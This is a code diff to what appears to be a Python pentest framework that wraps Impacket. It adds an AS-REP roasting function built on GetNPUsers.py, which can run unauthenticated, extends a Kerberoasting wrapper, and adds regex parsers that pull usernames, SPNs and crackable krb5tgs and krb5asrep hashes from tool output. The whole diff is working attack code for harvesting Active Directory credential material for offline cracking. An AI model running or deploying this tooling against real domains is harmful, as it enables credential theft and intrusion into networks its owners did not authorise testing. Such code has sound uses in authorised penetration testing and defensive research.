@@ -516,4 +516,138 @@ async def kerberoast(
         args.extend(["-target-user", target_user])
     if dc_ip and "-dc-ip" not in auth_args:
         args.extend(["-dc-ip", dc_ip])
-    return await run_impacket_tool("GetUserSPNs.py", args, timeout=timeout)
+    result = await run_impacket_tool("GetUserSPNs.py", args, timeout=timeout)
+
+    if result["success"]:
+        result["parsed"] = {
+            "tgs_hashes": _parse_kerberoast_hashes(result.get("output", "")),
+        }
+
+    return result
+
+
+async def asreproast(
+    domain: str,
+    dc_ip: str | None = None,
+    auth_args: list[str] | None = None,
+    username: str | None = None,
+    password: str | None = None,
+    nt_hash: str | None = None,
+    target_user: str | None = None,
+    users_file: str | None = None,
+    no_pass: bool = False,
+    timeout: int = 60,
+) -> dict[str, Any]:
+    """Run ``GetNPUsers.py`` to extract AS-REP hashes for roasting.
+
+    AS-REP roasting targets accounts with ``DONT_REQUIRE_PREAUTH``
+    set.  The AS-REP response contains an encrypted portion that can
+    be cracked offline.
+
+    Args:
+        domain: AD domain.
+        dc_ip: Domain controller IP.
+        auth_args: Pre-built auth flags (optional — can run unauthenticated).
+        username: Authenticating user (optional for enumeration).
+        password: Plaintext password.
+        nt_hash: NT hash.
+        target_user: Specific user to target (omit for all).
+        users_file: File containing usernames to check.
+        no_pass: Run without password (unauthenticated enumeration).
+        timeout: Maximum seconds.
+
+    Returns:
+        Result dict.  On success, ``parsed["asrep_hashes"]`` contains
+        extracted hashes.
+    """
+    if username:
+        target_str = build_target_string(domain, username, password, nt_hash)
+    else:
+        target_str = f"{domain}/"
+
+    args = [target_str, "-request"]
+
+    if auth_args:
+        args.extend(auth_args)
+
+    if no_pass and "-no-pass" not in args:
+        args.append("-no-pass")
+
+    if target_user:
+        # GetNPUsers uses -usersfile for specific users
+        # For a single user, write to a temp approach or use the domain/user format
+        args = [f"{domain}/{target_user}", "-request", "-no-pass"]
+        if auth_args:
+            args.extend(auth_args)
+
+    if users_file:
+        args.extend(["-usersfile", users_file])
+
+    if dc_ip and (not auth_args or "-dc-ip" not in auth_args):
+        args.extend(["-dc-ip", dc_ip])
+
+    result = await run_impacket_tool("GetNPUsers.py", args, timeout=timeout)
+
+    if result["success"]:
+        result["parsed"] = {
+            "asrep_hashes": _parse_asrep_hashes(result.get("output", "")),
+        }
+
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Hash parsers
+# ---------------------------------------------------------------------------
+
+
+def _parse_kerberoast_hashes(output: str) -> list[dict[str, str]]:
+    """Parse TGS hashes from GetUserSPNs.py output.
+
+    Hashes follow the pattern::
+
+        $krb5tgs$23$*user$REALM$domain/spn*$hex...
+
+    Returns:
+        List of dicts with ``username``, ``spn``, and ``hash`` keys.
+    """
+    results: list[dict[str, str]] = []
+    for line in output.splitlines():
+        line = line.strip()
+        if line.startswith("$krb5tgs$"):
+            # Extract username and SPN from the hash line
+            # Format: $krb5tgs$23$*user$REALM$SPN*$...
+            match = re.match(
+                r"(\$krb5tgs\$\d+\$)\*([^$]+)\$([^$]+)\$([^*]+)\*\$(.*)",
+                line,
+            )
+            if match:
+                results.append({
+                    "username": match.group(2),
+                    "spn": match.group(4),
+                    "hash": line,
+                })
+            else:
+                # Fallback: store the full hash line
+                results.append({"username": "unknown", "spn": "unknown", "hash": line})
+    return results
+
+
+def _parse_asrep_hashes(output: str) -> list[dict[str, str]]:
+    """Parse AS-REP hashes from GetNPUsers.py output.
+
+    Hashes follow the pattern::
+
+        $krb5asrep$23$user@DOMAIN:hex...
+
+    Returns:
+        List of dicts with ``username`` and ``hash`` keys.
+    """
+    results: list[dict[str, str]] = []
+    for line in output.splitlines():
+        line = line.strip()
+        if line.startswith("$krb5asrep$"):
+            match = re.match(r"\$krb5asrep\$\d+\$([^@:]+)[@:]", line)
+            username = match.group(1) if match else "unknown"
+            results.append({"username": username, "hash": line})
+    return results
